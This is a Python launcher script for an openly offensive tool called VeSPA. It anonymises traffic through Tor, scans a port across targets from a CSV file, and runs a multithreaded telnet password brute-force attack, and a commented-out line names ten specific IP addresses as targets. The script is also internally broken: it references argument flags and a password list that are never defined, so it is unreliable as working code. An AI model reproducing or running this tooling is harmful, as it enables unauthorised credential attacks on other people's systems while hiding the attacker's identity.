'''
@author: wardog
'''

import logging
import traceback
import time
import argparse
import socket
import socks
from VErySimplePortAttackToolkit.torManager import TorManager
from VErySimplePortAttackToolkit.serviceScanner import ServiceScanner
from VErySimplePortAttackToolkit import telnetDictionaryAttack

__version__ = "0.1"
__appName__ = "VeSPA"

if __name__ == '__main__':
    
    
    parser = argparse.ArgumentParser(prog=__appName__, description="VeSPA : the VEry Simple Port Attack tool.")
    parser.add_argument("-v",'--version', action='version', version='%(prog)s ' + __version__)
    parser.add_argument("-a", "--attack-type", help='will only perform an attack', choices=["scan", "bruteforce", "both"], required = True)
    parser.add_argument("-p","--port", type=int, help='tcp port number to scan', required = True)
    parser.add_argument("-d", "--dictionary-file", help='path to a dictionary file used to bruteforce the port.')
    #parser.add_argument("-s", "--scan", action="store_true", help='will only perform a port scan')
    #parser.add_argument("-a", "--attack", action="store_true", help='will only perform an attack')
    parser.add_argument("-en","--exit-node", help='exit node for the tor service. Eg : "ru" for russia')
    parser.add_argument("-t","--nb-threads", type=int, default=1, help='max number of threads. Default is 1.')



  
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)
    
    handler = logging.StreamHandler()
    handler.setLevel(logging.DEBUG)
    formatter = logging.Formatter("%(asctime)s %(threadName)s %(levelname)s %(filename)s %(funcName)s: %(message)s")
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    
    handler = logging.FileHandler("scan.log","a", encoding=None, delay="true")
    handler.setLevel(logging.INFO)
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    
    
    args = parser.parse_args()

    
        
    if args.dictionary_file:
        dicFile = args.dictionary_file
        print(dicFile)
        
    
    logger.info('Start app.')
    
    logger.debug('Start tor')
    torManager = TorManager('7000',args.exit_node)
    torManager.connect() 
            
    if args.scan :
        try :
            
            logger.debug('Init scanner')
            serviceScan = ServiceScanner(args.port,3,args.nb_threads,'targets.csv')
            
            logger.debug('Start scanner')
            serviceScan.startScan()
            logger.debug('Scanner started')
            
        except:
            logging.getLogger().error("Error occurs : " + traceback.format_exc())
        
        finally:
            time.sleep(60*15)
            
            serviceScan.stopScan()
            
            time.sleep(3)
            logger.debug('Scanners stopped')
            torManager.disconnect()
            
    if args.attack :
        try :
               
            
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 7000, True)
            socket.socket = socks.socksocket          
            
            logger.debug('Init attack')
            #serviceAttack = telnetDictionaryAttack.TelnetDictionaryAttack(loginPasswords , ["5.206.211.123:23","92.81.49.221:23","186.117.116.87:23","183.88.9.138:23","201.56.23.1:23","218.207.8.26:23","79.134.150.80:23","146.255.238.19:23","140.136.25.90:23","64.92.6.251:23"] , 11,3,10)
            serviceAttack = telnetDictionaryAttack.TelnetDictionaryAttack(dictionary = loginPasswords , listTargets = "targets.csv" , nbThread=args.nb_threads,timeOut=3,timeOutPassword=10, targetsResultFile='targetsResults.csv')
            
            logger.debug('Start attack')
            serviceAttack.startAttack()
            logger.debug('Attack started')
            
        except:
            logger.error("Error occurs : " + traceback.format_exc())
    

    
    logger.info('Quit app.')
            
        